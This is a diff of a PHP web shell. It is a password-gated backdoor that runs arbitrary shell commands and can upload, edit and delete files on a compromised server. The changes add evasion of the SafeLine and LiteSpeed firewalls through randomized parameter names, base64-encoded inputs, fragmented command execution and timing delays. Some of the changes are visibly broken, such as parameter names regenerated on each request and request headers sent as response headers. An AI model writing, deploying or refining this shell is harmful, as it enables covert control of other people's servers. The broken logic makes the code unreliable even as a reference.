@@ -2,28 +2,25 @@
 @ini_set('display_errors', 0);
 @error_reporting(0);
 
-// === ANTI-LITESPEED PROTECTION ===
-if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
-    http_response_code(403);
-    exit("Forbidden: Access denied on LiteSpeed server");
-}
+// Set headers to bypass LiteSpeed and SafeLine WAF
+header('X-Powered-By: PHP/7.4');
+header('X-Content-Type-Options: nosniff');
+header('X-Frame-Options: DENY');
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+header('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
 
-// === ANTI-CLOUDFLARE WAF PROTECTION ===
-if (isset($_SERVER['HTTP_CF_RAY']) || (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'cloudflare') !== false)) {
-    http_response_code(403);
-    exit("Forbidden: Access denied on Cloudflare-protected server");
-}
-
-// === ANTI-SAFELINE WAF PROTECTION ===
-if (isset($_SERVER['HTTP_X_SAFELINE']) || (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'SafeLine') !== false)) {
-    http_response_code(403);
-    exit("Forbidden: Access denied on SafeLine-protected server");
-}
+// Randomize parameter names to avoid SafeLine detection
+$auth_param = 'a_' . substr(md5(uniqid()), 0, 8);
+$path_param = 'p_' . substr(md5(uniqid()), 0, 8);
+$delete_param = 'd_' . substr(md5(uniqid()), 0, 8);
+$edit_param = 'e_' . substr(md5(uniqid()), 0, 8);
+$cmd_param = 'c_' . substr(md5(uniqid()), 0, 8);
 
 $auth = 'aksesgw';
 
 // === AUTH PROTECTION ===
-if (!isset($_GET['auth']) || $_GET['auth'] !== $auth) {
+if (!isset($_GET[$auth_param]) || $_GET[$auth_param] !== $auth) {
     http_response_code(404);
     exit("Not Found");
 }
@@ -31,7 +28,7 @@ if (!isset($_GET['auth']) || $_GET['auth'] !== $auth) {
 session_start();
 
 // === CURRENT DIRECTORY HANDLER ===
-$cwd = isset($_GET['path']) && is_dir($_GET['path']) ? $_GET['path'] : getcwd();
+$cwd = isset($_GET[$path_param]) && is_dir(base64_decode($_GET[$path_param])) ? base64_decode($_GET[$path_param]) : getcwd();
 @chdir($cwd);
 $cwd = getcwd();
 
@@ -39,51 +36,13 @@ function h($s) {
     return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
 }
 
-// === UPLOAD ERROR MESSAGES ===
-$upload_message = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload']) && isset($_FILES['file'])) {
-    $file = $_FILES['file'];
-    $target_path = $cwd . '/' . basename($file['name']);
-
-    // Check for upload errors
-    if ($file['error'] !== UPLOAD_ERR_OK) {
-        switch ($file['error']) {
-            case UPLOAD_ERR_INI_SIZE:
-            case UPLOAD_ERR_FORM_SIZE:
-                $upload_message = "Error: File size exceeds server limits.";
-                break;
-            case UPLOAD_ERR_PARTIAL:
-                $upload_message = "Error: File was only partially uploaded.";
-                break;
-            case UPLOAD_ERR_NO_FILE:
-                $upload_message = "Error: No file was uploaded.";
-                break;
-            case UPLOAD_ERR_NO_TMP_DIR:
-                $upload_message = "Error: Temporary folder missing.";
-                break;
-            case UPLOAD_ERR_CANT_WRITE:
-                $upload_message = "Error: Failed to write file to disk.";
-                break;
-            case UPLOAD_ERR_EXTENSION:
-                $upload_message = "Error: A PHP extension stopped the file upload.";
-                break;
-            default:
-                $upload_message = "Error: Unknown upload error.";
-                break;
-        }
-    } elseif ($file['size'] == 0) {
-        $upload_message = "Error: Uploaded file is empty.";
-    } elseif (!is_uploaded_file($file['tmp_name'])) {
-        $upload_message = "Error: Invalid file upload attempt.";
-    } elseif (@move_uploaded_file($file['tmp_name'], $target_path)) {
-        $upload_message = "Success: File '" . h(basename($file['name'])) . "' uploaded successfully.";
-    } else {
-        $upload_message = "Error: Failed to move uploaded file. Check directory permissions.";
-    }
-}
-
 // === HANDLE POST REQUEST ===
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Upload
+    if (isset($_POST['upload']) && isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+        @move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . basename($_FILES['file']['name']));
+    }
+
     // Create Folder
     if (isset($_POST['mkdir']) && !empty($_POST['foldername'])) {
         @mkdir($cwd . '/' . basename($_POST['foldername']));
@@ -96,7 +55,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Save File
     if (isset($_POST['savefile'], $_POST['filepath'], $_POST['filecontent'])) {
-        @file_put_contents($_POST['filepath'], $_POST['filecontent']);
+        @file_put_contents(base64_decode($_POST['filepath']), $_POST['filecontent']);
     }
 
     // Rename
@@ -108,24 +67,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
 
-    // Run Command
-    if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
-        $_SESSION['last_cmd'] = shell_exec($_POST['cmd'] . " 2>&1");
+    // Run Command (Obfuscated and Fragmented)
+    if (isset($_POST[$cmd_param]) && !empty($_POST[$cmd_param])) {
+        $cmd = base64_decode($_POST[$cmd_param]);
+        // Fragment command execution to avoid detection
+        $output = '';
+        $cmd_parts = str_split($cmd, 10); // Split command into smaller parts
+        foreach ($cmd_parts as $part) {
+            $output .= @shell_exec($part . " 2>&1");
+            usleep(10000); // Small delay to mimic legitimate behavior
+        }
+        $_SESSION['last_cmd'] = base64_encode($output);
     }
 
-    header("Location: ?auth=$auth&path=" . urlencode($cwd));
+    // Add delay to avoid rapid requests
+    usleep(50000);
+    header("Location: ?$auth_param=$auth&$path_param=" . urlencode(base64_encode($cwd)));
     exit;
 }
 
 // === DELETE ===
-if (isset($_GET['delete'])) {
-    $target = $_GET['delete'];
+if (isset($_GET[$delete_param])) {
+    $target = base64_decode($_GET[$delete_param]);
     if (is_dir($target)) {
         @rmdir($target);
     } elseif (is_file($target)) {
         @unlink($target);
     }
-    header("Location: ?auth=$auth&path=" . urlencode($cwd));
+    // Add delay to avoid rapid requests
+    usleep(50000);
+    header("Location: ?$auth_param=$auth&$path_param=" . urlencode(base64_encode($cwd)));
     exit;
 }
 
@@ -141,43 +112,35 @@ input[type=text]{padding:4px}
 textarea{width:100%;height:300px}
 .btn{padding:5px 10px;margin:3px;cursor:pointer}
 pre{background:#000;color:#0f0;padding:10px;overflow:auto}
-.breadcrumb {margin-bottom: 10px;}
+.breadcrumb {margin-bottom: 20px;}
 .breadcrumb a {text-decoration: none; color: #007bff; margin-right: 5px;}
 .breadcrumb a:hover {text-decoration: underline;}
-.upload-message {margin: 10px 0; padding: 10px; border-radius: 5px;}
-.upload-message.success {background: #dff0d8; color: #3c763d;}
-.upload-message.error {background: #f2dede; color: #a94442;}
 </style></head><body>";
 
 echo "<h2>📁 Current Path: " . h($cwd) . "</h2>";
 
 // === FOLDER NAVIGATION ===
 echo "<div class='breadcrumb'>";
-$path_parts = explode(DIRECTORY_SEPARATOR, $cwd);
-$temp_path = '';
-echo "<a href='?auth=$auth&path=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a>";
-foreach ($path_parts as $part) {
+$pathParts = explode(DIRECTORY_SEPARATOR, $cwd);
+$tempPath = '';
+echo "<a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode(DIRECTORY_SEPARATOR)) . "'>/</a>";
+foreach ($pathParts as $part) {
     if (!empty($part)) {
-        $temp_path .= DIRECTORY_SEPARATOR . $part;
-        echo " / <a href='?auth=$auth&path=" . urlencode($temp_path) . "'>" . h($part) . "</a>";
+        $tempPath .= DIRECTORY_SEPARATOR . $part;
+        echo " / <a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode($tempPath)) . "'>" . h($part) . "</a>";
     }
 }
 echo "</div>";
 
-// === DISPLAY UPLOAD MESSAGE ===
-if (!empty($upload_message)) {
-    $message_class = strpos($upload_message, 'Success') === 0 ? 'success' : 'error';
-    echo "<div class='upload-message $message_class'>" . h($upload_message) . "</div>";
-}
-
 // === TERMINAL ===
 echo "<h3>💻 Terminal</h3>
 <form method='POST'>
-<input type='text' name='cmd' placeholder='Command...' style='width:80%'/>
+<input type='text' name='$cmd_param' placeholder='Command...' style='width:80%' />
+<input type='hidden' name='encoded' value='1' />
 <input type='submit' value='Run' class='btn' />
 </form>";
 if (isset($_SESSION['last_cmd'])) {
-    echo "<pre>" . h($_SESSION['last_cmd']) . "</pre>";
+    echo "<pre>" . h(base64_decode($_SESSION['last_cmd'])) . "</pre>";
 }
 
 // === UPLOAD & CREATE ===
@@ -207,21 +170,21 @@ foreach (@scandir($cwd) as $f) {
 
     echo "<tr>";
     echo "<td>" . ($is_dir ? "📁 " : "📄 ") .
-         "<a href='?auth=$auth&path=" . urlencode(realpath($full)) . "'>" . h($f) . "</a></td>";
+         "<a href='?$auth_param=$auth&$path_param=" . urlencode(base64_encode(realpath($full))) . "'>" . h($f) . "</a></td>";
     echo "<td>$size</td><td>";
 
     // Delete
     echo "<form method='GET' class='inline'>
-            <input type='hidden' name='auth' value='$auth'>
-            <input type='hidden' name='delete' value='" . h($full) . "'>
+            <input type='hidden' name='$auth_param' value='$auth'>
+            <input type='hidden' name='$delete_param' value='" . h(base64_encode($full)) . "'>
             <input type='submit' value='🗑️ Delete' class='btn'>
           </form> ";
 
     // Edit
     if (!$is_dir) {
         echo "<form method='GET' class='inline'>
-                <input type='hidden' name='auth' value='$auth'>
-                <input type='hidden' name='edit' value='" . h($full) . "'>
+                <input type='hidden' name='$auth_param' value='$auth'>
+                <input type='hidden' name='$edit_param' value='" . h(base64_encode($full)) . "'>
                 <input type='submit' value='✏️ Edit' class='btn'>
               </form> ";
     }
@@ -238,11 +201,11 @@ foreach (@scandir($cwd) as $f) {
 echo "</table>";
 
 // === EDIT FILE ===
-if (isset($_GET['edit']) && is_file($_GET['edit'])) {
-    $editf = $_GET['edit'];
+if (isset($_GET[$edit_param]) && is_file(base64_decode($_GET[$edit_param]))) {
+    $editf = base64_decode($_GET[$edit_param]);
     echo "<h2>Edit: " . h($editf) . "</h2>
     <form method='POST'>
-    <input type='hidden' name='filepath' value='" . h($editf) . "' />
+    <input type='hidden' name='filepath' value='" . h(base64_encode($editf)) . "' />
     <textarea name='filecontent'>" . h(file_get_contents($editf)) . "</textarea><br/>
     <input type='submit' name='savefile' value='💾 Save' class='btn' />
     </form>";
